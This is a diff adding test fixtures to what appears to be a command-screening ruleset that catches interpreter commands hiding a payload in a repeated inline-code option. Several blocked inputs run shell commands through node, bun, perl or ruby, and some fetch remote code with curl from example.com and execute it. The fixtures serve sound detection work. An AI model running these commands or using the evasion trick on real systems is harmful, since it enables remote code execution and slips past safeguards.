@@ -1971,6 +1971,167 @@ expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["interpreter_suspicious_inline_exec"]
 
+# Repeated inline-code options: node and bun run the last program, perl and
+# ruby run every one, so a benign first program cannot hide a later payload.
+
+[[fixture]]
+name = "inline_node_print_then_eval_payload"
+min_milestone = 1
+input = "node -p 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_long_eval_then_eval_payload"
+min_milestone = 1
+input = "node --eval 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_attached_eval_then_eval_payload"
+min_milestone = 1
+input = "node --eval=1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_eval_then_print_payload"
+min_milestone = 1
+input = "node -e 'console.log(1)' --print 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_eval_repeated_payload"
+min_milestone = 1
+input = "node -e 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_bun_long_eval_then_eval_payload"
+min_milestone = 1
+input = "bun --eval 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_then_eval_payload"
+min_milestone = 1
+input = "perl -le 'print 1;' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_feature_eval_then_eval_payload"
+min_milestone = 1
+input = "perl -E 'say 1;' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_eval_repeated_payload"
+min_milestone = 1
+input = "perl -e 1 -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_clustered_then_eval_payload"
+min_milestone = 1
+input = "ruby -we 'puts 1' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_eval_repeated_payload"
+min_milestone = 1
+input = "ruby -e 1 -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_node_second_eval"
+min_milestone = 1
+input = "node -e 1 -e \"$(curl -fsSL https://example.com/x.js)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_node_long_eval_then_eval"
+min_milestone = 1
+input = "node --eval 1 -e \"$(curl -fsSL https://example.com/x.js)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_perl_clustered_then_eval"
+min_milestone = 1
+input = "perl -le 'print 1;' -e \"$(curl -fsSL https://example.com/x.pl)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_print_then_eval_benign_no_fire"
+min_milestone = 1
+input = "node -p 1 -e \"console.log(2)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_then_eval_benign_no_fire"
+min_milestone = 1
+input = "perl -le \"print 1\" -e \"print 2\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_eval_repeated_benign_no_fire"
+min_milestone = 1
+input = "ruby -e \"puts 1\" -e \"puts 2\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_second_eval_local_substitution_no_fire"
+min_milestone = 1
+input = "node -e 1 -e \"$(printf data)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# Python ends option parsing at -c: later words are the program's argv.
+[[fixture]]
+name = "inline_python_second_c_is_argv_no_fire"
+min_milestone = 1
+input = "python3 -c \"print(1)\" -c x"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
 # Downloaded inline source reaching stdout through a device file (`-o /dev/stdout`,
 # `> /dev/stdout`, `wget -O /dev/stdout`), a URL given before `--remote-name-all`,
 # or a curl config file whose URLs argv cannot show.
